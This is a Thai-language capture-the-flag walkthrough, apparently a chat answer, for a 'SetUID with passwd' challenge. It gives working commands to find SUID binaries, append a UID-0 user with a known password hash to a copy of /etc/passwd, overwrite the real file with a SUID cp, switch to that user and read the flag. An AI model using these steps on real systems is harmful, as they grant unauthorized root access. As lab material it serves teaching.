# SetUID with passwd

โจทย์ข้อนี้สนุกมากครับ เป็นเทคนิค **Privilege Escalation** คลาสสิกโดยการเขียนทับไฟล์ `/etc/passwd` เพื่อสร้าง User ใหม่ที่เป็น Root ขึ้นมาเอง

หลักการคือ: ใน Linux ไฟล์ `/etc/passwd` จะเก็บรายชื่อ User และสิทธิ์ต่างๆ ถ้าเราแก้ไฟล์นี้ได้ เราก็แค่เพิ่มบรรทัดใหม่เข้าไป แล้วกำหนดให้ User นั้นมี UID เป็น `0` (ซึ่งคือ UID ของ Root)

มาทำตามขั้นตอนกันเลยครับ:

### ขั้นตอนที่ 1: หาตำแหน่งของไฟล์ cp ที่ติด SUID

ก่อนอื่นต้องมั่นใจก่อนว่าเราใช้ `cp` ตัวไหนที่มีสิทธิ์ SUID (อาจจะเป็น `/usr/bin/cp` หรือไฟล์ที่ซ่อนอยู่)
พิมพ์คำสั่งเช็คดูครับ:

Bash

`find / -perm -4000 -type f 2>/dev/null`

*ถ้าเจอว่า `/usr/bin/cp` หรือ `/bin/cp` มีตัวแดงๆ หรืออยู่ในลิสต์ ก็แปลว่าใช้ตัวนั้นได้เลย*

---

### ขั้นตอนที่ 2: เตรียมไฟล์ passwd ใหม่

เราไม่ควรสร้างไฟล์เปล่าๆ ที่มีแค่ user `john` เพราะจะทำให้ระบบรวน (User อื่นหายหมด) วิธีที่ดีคือ **ก๊อปปี้ไฟล์เดิมออกมา แล้วเพิ่มบรรทัดของเราต่อท้าย**

1. **Copy ไฟล์ passwd ปัจจุบันไปไว้ที่ /tmp ก่อน**Bash
    
    `cat /etc/passwd > /tmp/passwd`
    
2. **เพิ่ม User "john" (ที่เป็น Root) ต่อท้ายไฟล์**
เราจะใช้ Hash Password ที่โจทย์ให้มา (`$1$john$z0j/qJZcCrNz961vt1ymU1` ซึ่งถอดรหัสได้ว่า `123456789`) และกำหนด UID/GID เป็น 0 (Root)Bash
    
    พิมพ์คำสั่งนี้เพื่อเพิ่มบรรทัดลงไปในไฟล์ชั่วคราว:
    
    `echo 'john:$1$john$z0j/qJZcCrNz961vt1ymU1:0:0:root:/root:/bin/bash' >> /tmp/passwd`
    
    *เช็คความถูกต้อง:* ลอง `cat /tmp/passwd` ดู บรรทัดสุดท้ายควรเป็น user john
    

---

### ขั้นตอนที่ 3: เขียนทับไฟล์จริงด้วย SUID cp

ตอนนี้เรามีไฟล์ `/tmp/passwd` ที่เตรียมไว้แล้ว เราจะใช้พลังของ SUID `cp` เพื่อเขียนทับไฟล์ระบบ

*(สมมติว่า cp อยู่ที่ `/bin/cp` ถ้าคุณหาเจอที่อื่นให้เปลี่ยน path ตามจริง)*

Bash

`/bin/cp /tmp/passwd /etc/passwd`

---

### ขั้นตอนที่ 4: แปลงร่างเป็น Root (Login)

ตอนนี้ในระบบมี User ชื่อ `john` ที่มีสิทธิ์เท่า Root แล้ว

1. **Switch User:**Bash
    
    `su john`
    
2. **ใส่ Password:**Plaintext
    
    `123456789`
    
3. **ตรวจสอบสถานะ:**Bash
    
    `id`
    
    *(ค่า uid ต้องเป็น 0(root))*
    

---

### ขั้นตอนที่ 5: อ่าน Flag

เมื่อเป็น Root แล้ว ก็เข้าไปอ่านไฟล์ได้เลยครับ

Bash

`cat /root/flag.txt`